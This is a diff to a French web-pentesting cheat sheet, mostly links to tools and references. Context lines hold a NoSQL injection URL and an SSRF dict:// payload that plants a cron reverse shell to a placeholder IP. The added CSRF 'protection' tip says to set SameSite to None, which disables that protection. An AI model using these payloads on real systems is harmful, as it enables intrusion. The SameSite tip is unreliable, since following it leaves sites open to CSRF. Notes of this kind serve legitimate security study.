@@ -8,6 +8,7 @@
 - [Obfu](https://deobfuscate.relative.im/)
 - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
 - [Gopherus](https://github.com/tarunkant/Gopherus)
+- [Nuclei](https://red-security.fr/t/tutoriel-nuclei/92)
 - [RSS Validator](https://validator.w3.org/feed/)
 - [Tplmap](https://github.com/epinna/tplmap)
 
@@ -59,19 +60,12 @@ Accéder
 ## Doc
 
 - http://wikisecu.fr/doku.php?id=web
-
 - https://owasp.org/www-community/Source_Code_Analysis_Tools
-
 - [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)
-
 - [OWASP Cheatsheet Series - Top 10][https://cheatsheetseries.owasp.org/IndexTopTen.html]
-
 - [Hacktricks](https://book.hacktricks.xyz/welcome/readme), [Hacktricks - Bypass 403](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)
-
 - [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
-
 - https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
-
 - https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Spring%20boot%20-%20Reference%20guide.pdf
 
 **Serveur**
@@ -102,6 +96,9 @@ $file = basename(realpath($_GET["filename"]));
 include("pages/$file");
 ?>
 ```
+et
+
+`allow_url_include = Off` pour PHP<7.4.0
 
 ### SQLi
 
@@ -135,6 +132,10 @@ BEUST: Blind,Error,Union,Stacked,Time-based
 ```
 https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22flag%22,%22as%22:%22str%22,%22foreignField%22:%22flag%22,%22localField%22:%22flag
 ```
+
+### SSTI
+
+- https://cheatsheet.hackmanit.de/template-injection-table/
 
 ### Java 
 
@@ -200,6 +201,14 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 - https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
+
+`Protection:`
+
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value
+
+````
+Header Set-Cookie: mettre le scope de l'attribut SameSite = None
+```
 
 ### DOM - notions
 
